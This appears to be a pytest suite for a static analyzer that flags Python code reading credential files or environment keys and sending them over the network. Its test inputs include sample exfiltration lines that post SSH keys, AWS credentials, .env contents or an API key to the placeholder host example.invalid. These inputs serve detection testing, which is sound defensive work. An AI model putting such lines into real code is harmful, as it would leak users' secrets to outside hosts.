"""A read and an unrelated network call must not become a dataflow finding."""
import hashlib
import json
from pathlib import Path
import socket
import subprocess
import sys
import pytest
from protocol.corpus import CorpusError
from tools import credential_flow as f

ROOT = Path(__file__).resolve().parents[1]
PREFIX = 'import requests\nfrom pathlib import Path\n'


@pytest.mark.parametrize('program', [
    'requests.post("https://example.invalid", data=Path("~/.ssh/id_rsa").read_text())',
    'secret=Path(".env").read_bytes()\nrequests.post("https://example.invalid", data=secret)',
    'secret=open("~/.aws/credentials", "rb").read()\ncopy=secret\nrequests.put("https://example.invalid", data=copy)',
    'secret=Path("~/.ssh/id_ed25519").read_text()\nrequests.patch("https://example.invalid", json={"value":secret})',
    'secret=Path(".env").read_text()\nrequests.get("https://example.invalid", params={"credential":secret})',
    'secret=Path(".env").read_text()\nrequests.post("https://example.invalid", headers={"Authorization":"Bearer "+secret})',
])
def test_direct_and_assigned_credential_flows(program):
    subject = PREFIX+program
    out = f.observe(subject)
    assert out['state'] == 'STATIC_FLOW' and len(out['findings']) == 1
    finding = out['findings'][0]
    assert finding['id'] == 'sig.credential_exfil.v1'
    assert 'requests.' in subject[slice(*finding['sink_span'])]
    assert '.read' in subject[slice(*finding['source_spans'][0])]
    assert out['tags'] == [] and out['network_used'] is False and out['subject_executed'] is False
    assert out['secret_contents_read'] is False and out['live_credential_verified'] is False
    assert out['intent_established'] is False and out['independent_accuracy_evidence'] is False


def test_import_aliases_and_environment_read_are_static():
    subject = 'import requests as http\nimport os as environment\nsecret=environment.environ["OPENAI_API_KEY"]\nhttp.post("https://example.invalid", data=secret)'
    out = f.observe(subject)
    assert out['state'] == 'STATIC_FLOW'
    assert subject[slice(*out['findings'][0]['source_spans'][0])] == 'environment.environ["OPENAI_API_KEY"]'
    assert 'OPENAI_API_KEY' not in json.dumps(out)


@pytest.mark.parametrize('program', [
    'secret=Path(".env").read_text()\nrequests.post("https://example.invalid", data="unrelated")',
    'secret=Path(".env").read_text()\nsecret="overwritten"\nrequests.post("https://example.invalid", data=secret)',
    'requests.post("https://example.invalid", data=Path("public-guide.txt").read_text())',
    'credential_file=open(".env")\nrequests.post("https://example.invalid", data="hello")',
    'secret=Path(".env").read_text()\nrequests.post("https://example.invalid", timeout=secret)',
    '# requests.post("https://example.invalid", data=Path(".env").read_text())\npass',
    '"requests.post data Path .env read_text"',
])
def test_unrelated_or_unread_values_are_not_flows(program):
    out = f.observe(PREFIX+program)
    assert out['state'] == 'NO_SUPPORTED_FLOW' and not out['findings']


def test_nonsecret_environment_value_not_called_credential():
    subject = 'import requests\nimport os\nrequests.post("https://example.invalid", data=os.environ["DISPLAY"])'
    assert f.observe(subject)['state'] == 'NO_SUPPORTED_FLOW'


def test_multiple_reads_same_value_and_sink_positions():
    subject = PREFIX+'a=Path(".env").read_text()\nb=Path("~/.aws/credentials").read_text()\nrequests.post("https://example.invalid", data=[a,b,a])'
    out = f.observe(subject)
    assert len(out['findings'][0]['source_spans']) == 2
    assert len(out['recognized_read_spans']) == 2


def test_utf8_ast_positions_are_converted_to_unicode_codepoints():
    subject = PREFIX+'label="😀café"; secret=Path(".env").read_text()\nrequests.post("https://example.invalid", data=secret)'
    out = f.observe(subject)
    assert subject[slice(*out['findings'][0]['source_spans'][0])] == 'Path(".env").read_text()'
    assert out['subject_sha256'] == hashlib.sha256(subject.encode()).hexdigest()


@pytest.mark.parametrize('program', [
    'requests="fake"\nrequests.post("https://example.invalid", data="value")',
    'open="fake"\nsecret=open(".env").read()',
    'secret=Path(".env").read_text().encode()\nrequests.post("https://example.invalid", data=secret)',
    'if True:\n requests.post("https://example.invalid", data="value")',
    'def function():\n return Path(".env").read_text()',
    'for item in [1]:\n pass',
    'secret=unknown(".env")',
    'secret=Path(path).read_text()',
    'requests.post(url, data="value")',
    'requests.post("https://user:pass@example.invalid", data="value")',
    'requests.post("https://example.invalid:bad", data="value")',
    'requests.post("file:///tmp/secret", data="value")',
    'requests.post("https://example.invalid", data="value", unknown=True)',
    'requests.post("https://example.invalid", **arguments)',
    'secret=Path("../.env").read_text()',
    'secret=open(".env", "w").read()',
    'secret=Path(".env").read_text(encoding="utf-8")',
    'from requests import post\npost("https://example.invalid", data="value")',
    'import subprocess\nsubprocess.run("cat .env")',
    'class Example:\n pass',
    'a,b=[1,2]',
    'secret=[value for value in [1]]',
    'import os\nsecret=os.environ[key]',
])
def test_unknown_syntax_or_transform_is_unavailable_not_a_negative(program):
    with pytest.raises(CorpusError): f.observe(PREFIX+program)


@pytest.mark.parametrize('subject', ['', ' ', '\x00', '\ud800', 'x'*8001, None, 'broken Python!', '(' * 400])
def test_bounded_invalid_subjects(subject):
    with pytest.raises(CorpusError): f.observe(subject)


def test_real_cli_never_reads_named_file_or_uses_network(tmp_path, monkeypatch):
    secret = tmp_path/'.env'; secret.write_text('PRIVATE_FILE_CANARY')
    subject = PREFIX+f'requests.post("https://example.invalid", data=Path({str(secret)!r}).read_text())'
    monkeypatch.setattr(socket, 'socket', lambda *a, **kw: (_ for _ in ()).throw(AssertionError('Network forbidden')))
    out = f.observe(subject)
    assert out['state'] == 'STATIC_FLOW' and 'PRIVATE_FILE_CANARY' not in json.dumps(out)
    good = subprocess.run([sys.executable, str(ROOT/'scripts/credential-flow.py')], input=subject, text=True, capture_output=True)
    assert good.returncode == 0 and json.loads(good.stdout)['state'] == 'STATIC_FLOW'
    assert 'PRIVATE_FILE_CANARY' not in good.stdout + good.stderr and str(secret) not in good.stdout
    bad = subprocess.run([sys.executable, str(ROOT/'scripts/credential-flow.py')], input='PRIVATE_INPUT_CANARY is not Python', text=True, capture_output=True)
    assert bad.returncode == 2 and json.loads(bad.stdout)['state'] == 'UNAVAILABLE'
    assert 'PRIVATE_INPUT_CANARY' not in bad.stdout + bad.stderr


def test_source_identity_and_no_modification_of_the_program():
    subject = PREFIX+'secret=Path(".env").read_text()\nrequests.post("https://example.invalid", data=secret)'
    out = f.observe(subject)
    assert out == f.observe(subject)
    assert out['method_sha256'] == hashlib.sha256((ROOT/'tools/credential_flow.py').read_bytes()).hexdigest()
